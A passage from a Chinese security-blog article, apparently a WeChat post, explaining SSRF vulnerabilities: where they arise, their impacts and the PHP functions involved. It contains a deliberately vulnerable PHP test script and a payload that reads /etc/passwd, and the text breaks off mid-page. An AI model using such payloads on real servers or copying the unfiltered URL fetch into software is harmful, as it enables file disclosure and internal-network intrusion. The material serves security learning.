<html>
<head>
<title>干货SSRF漏洞利用总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | SSRF漏洞利用总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    WHOAMI
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-04-01</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;" data-mpa-powered-by="yiban.io"><img data-ratio="0.5272727272727272" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/1_2BCnhBBBfxEib3ACyf1Tbd0uX9pVoQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5goaBmngONzzibunlnhYOZeMvD6L2BCnhBBBfxEib3ACyf1Tbd0uX9pVoQ/640?wx_fmt=png'" data-type="png" data-w="3245" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">漏洞详情</a></h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.7089084065244667" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/2_D6EtJ2icxh6xNHGicYj7Cw2StZFicg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gX2s9aahuxqiccSU4yaibrrJG0ia6d7D6EtJ2icxh6xNHGicYj7Cw2StZFicg/640?wx_fmt=png'" data-type="png" data-w="797" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">容易出现SSRF的地方有：</strong></p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><ol style="padding-left: 30px;list-style-position: initial;list-style-image: initial;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">社交分享功能：获取超链接的标题等内容进行显示</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">在线翻译：给网址翻译对应网页的内容</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">数据库内置功能：数据库的比如mongodb的copyDatabase函数</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">邮件系统：比如接收邮件服务器地址</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">从远程服务器请求资源</span></p></li></ol></blockquote><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">SSRF漏洞的危害：</strong></p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><ol style="padding-left: 30px;list-style-position: initial;list-style-image: initial;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">对内网Web应用进行指纹识别，识别企业内部的资产信息。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">利用file协议读取服务器本地文件等。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">进行跳板攻击等。</span></p></li></ol></blockquote><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">SSRF漏洞相关函数和类</h2><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;color: rgb(80, 97, 109);font-size:15px;line-height:35px;;text-align: start;white-space: normal;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">filegetcontents()：将整个文件或一个url所指向的文件读入一个字符串中。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">readfile()：输出一个文件的内容。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">curlexec()：初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">fopen()：打开一个文件文件或者 URL。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">......</span></p></li></ul><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">上述函数函数使用不当会造成SSRF漏洞。此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">file<span style="font-weight: 400;">get</span>contents()</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">// ssrf.php</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$url </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> $_GET</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">[</span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">'url'</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">];;</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo file_get_contents</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">);</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?&gt;</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">上述测试代码中，filegetcontents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">ssrf</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">?</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">url</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">=../../../../../</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">etc</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">/</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">passwd</span></code> 的paylaod即可读取服务器本地的任意文件。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.37781954887218044" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/3_qwNtaXk8Qa0LY5ka9eTzsgNyqPb1AQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gIfIEDUCDR34o7s6Qdk8Kf6mibqwNtaXk8Qa0LY5ka9eTzsgNyqPb1AQ/640?wx_fmt=png'" data-type="png" data-w="1064" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">也可以进行远程访问：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5364583333333334" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/4_XgdXdCvT5Y2wZia0uboEU98y1ugrvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g28BCxAh4vooR7b3VUHdtrkljlXgdXdCvT5Y2wZia0uboEU98y1ugrvA/640?wx_fmt=png'" data-type="png" data-w="1920" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: 